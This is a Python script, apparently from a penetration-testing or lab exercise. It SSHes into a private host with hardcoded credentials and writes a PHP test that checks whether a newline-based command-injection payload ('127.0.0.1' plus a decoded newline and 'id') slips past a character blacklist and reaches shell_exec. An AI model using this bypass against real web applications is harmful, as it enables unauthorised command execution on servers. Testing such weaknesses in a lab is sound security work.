"""Test B-2 command injection bypass locally before testing via web."""
import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('192.168.120.10', username='gdadmin', password='Gdadmin@123', timeout=30)

# Write PHP test script via SFTP
php_code = '''<?php
// Test blacklist bypass with URL-decoded newline
$target = '127.0.0.1' . urldecode('%0a') . 'id';
echo 'Target: ' . var_export($target, true) . PHP_EOL;

$blacklist = ['|', ';', '&', '$', '`'];
$blocked = false;
foreach ($blacklist as $char) {
    if (strpos($target, $char) !== false) {
        echo 'BLOCKED by: ' . $char . PHP_EOL;
        $blocked = true;
    }
}
if (!$blocked) {
    echo 'PASSED blacklist!' . PHP_EOL;
    $cmd = 'ping -c 3 ' . $target . ' 2>&1';
    echo 'CMD: ' . $cmd . PHP_EOL;
    echo 'OUTPUT:' . PHP_EOL;
    echo shell_exec($cmd);
}
'''

sftp = ssh.open_sftp()
fh = sftp.open('/home/gdadmin/test_diag.php', 'w')
fh.write(php_code)
fh.close()
sftp.close()

# Run it
stdin, stdout, stderr = ssh.exec_command('php /home/gdadmin/test_diag.php 2>&1', timeout=15)
out = stdout.read().decode('utf-8', errors='replace')
err = stderr.read().decode('utf-8', errors='replace')
print(out[:2000])
if err.strip():
    print(f'[stderr] {err.strip()[:500]}')

ssh.close()
